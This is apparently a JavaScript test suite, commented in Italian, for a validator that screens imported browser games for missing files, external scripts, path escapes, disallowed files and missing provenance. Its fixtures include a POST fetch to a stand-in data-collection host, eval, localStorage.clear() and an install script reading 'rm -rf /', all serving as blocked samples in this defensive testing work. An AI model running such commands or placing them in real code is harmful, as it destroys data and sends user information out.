/*
 * Test della verifica dei giochi:
 *
 *   node --test strumenti/tests/*.test.js
 *
 * Ogni test crea un piccolo gioco finto in una cartella temporanea.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';

import { verificaGioco } from '../verifica.js';

const PROVENIENZA = { provenienza: { repository: 'https://github.com/compagna/sala-giochi', commit: 'abc1234' } };

/** Crea un gioco finto con i file indicati ({ 'percorso': 'contenuto' }) e restituisce la cartella. */
function creaGioco(files) {
  const cartella = mkdtempSync(join(tmpdir(), 'gioco-'));
  for (const [percorso, contenuto] of Object.entries(files)) {
    mkdirSync(dirname(join(cartella, percorso)), { recursive: true });
    writeFileSync(join(cartella, percorso), contenuto);
  }
  return cartella;
}

const GIOCO_BUONO = {
  'index.html': '<!doctype html><link rel="stylesheet" href="style.css"><script type="module" src="js/main.js"></script>',
  'style.css': 'body { background: url("img/sfondo.png"); }',
  'img/sfondo.png': 'png',
  'js/main.js': "import { regole } from './regole.js';\nconsole.log(regole);",
  'js/regole.js': 'export const regole = 1;',
};

test('un gioco in regola passa la verifica', () => {
  const cartella = creaGioco(GIOCO_BUONO);
  const risultato = verificaGioco(cartella, { provenienza: PROVENIENZA });
  assert.deepEqual(risultato.errori, []);
  assert.equal(risultato.ok, true);
  rmSync(cartella, { recursive: true });
});

test('senza index.html il gioco resta fuori', () => {
  const cartella = creaGioco({ 'gioco.html': '<p>ciao</p>', 'package.json': '{}' });
  const { ok, errori } = verificaGioco(cartella, { provenienza: PROVENIENZA });
  assert.equal(ok, false);
  assert.ok(errori.some((e) => e.includes('index.html')));
  assert.ok(errori.some((e) => e.includes('build step')));
  rmSync(cartella, { recursive: true });
});

test('uno script da CDN viene bloccato', () => {
  const cartella = creaGioco({ ...GIOCO_BUONO, 'index.html': '<script src="https://cdn.example.com/lib.js"></script>' });
  const { ok, errori } = verificaGioco(cartella, { provenienza: PROVENIENZA });
  assert.equal(ok, false);
  assert.ok(errori.some((e) => e.includes('da Internet')));
  rmSync(cartella, { recursive: true });
});

test('il codice sospetto viene bloccato', () => {
  const cartella = creaGioco({
    ...GIOCO_BUONO,
    'js/main.js': "eval('1+1'); fetch('https://raccolta-dati.example/x', { method: 'POST' }); localStorage.clear();",
  });
  const { ok, errori } = verificaGioco(cartella, { provenienza: PROVENIENZA });
  assert.equal(ok, false);
  assert.ok(errori.some((e) => e.includes('eval')));
  assert.ok(errori.some((e) => e.includes('sito esterno')));
  assert.ok(errori.some((e) => e.includes('localStorage')));
  rmSync(cartella, { recursive: true });
});

test('i percorsi che escono dalla cartella del gioco vengono bloccati', () => {
  const cartella = creaGioco({ ...GIOCO_BUONO, 'js/main.js': "import '../../memory/js/game.js';" });
  const { ok, errori } = verificaGioco(cartella, { provenienza: PROVENIENZA });
  assert.equal(ok, false);
  assert.ok(errori.some((e) => e.includes('esce dalla cartella')));
  rmSync(cartella, { recursive: true });
});

test('file mancanti e tipi di file non ammessi vengono segnalati', () => {
  const cartella = creaGioco({ ...GIOCO_BUONO, 'style.css': 'body { background: url("manca.png"); }', 'installa.sh': 'rm -rf /' });
  const { errori } = verificaGioco(cartella, { provenienza: PROVENIENZA });
  assert.ok(errori.some((e) => e.includes('non esiste')));
  assert.ok(errori.some((e) => e.includes('installa.sh') && e.includes('non ammesso')));
  rmSync(cartella, { recursive: true });
});

test('un gioco importato deve dire da quale repository arriva', () => {
  const cartella = creaGioco(GIOCO_BUONO);
  assert.ok(verificaGioco(cartella).errori.some((e) => e.includes('provenienza')));
  assert.ok(verificaGioco(cartella, { provenienza: { provenienza: {} } }).errori.some((e) => e.includes('repository')));
  rmSync(cartella, { recursive: true });
});

test('i moduli di Node nei test del gioco non contano come file', () => {
  const cartella = creaGioco({ ...GIOCO_BUONO, 'tests/regole.test.js': "import { test } from 'node:test';" });
  assert.equal(verificaGioco(cartella, { provenienza: PROVENIENZA }).ok, true);
  rmSync(cartella, { recursive: true });
});
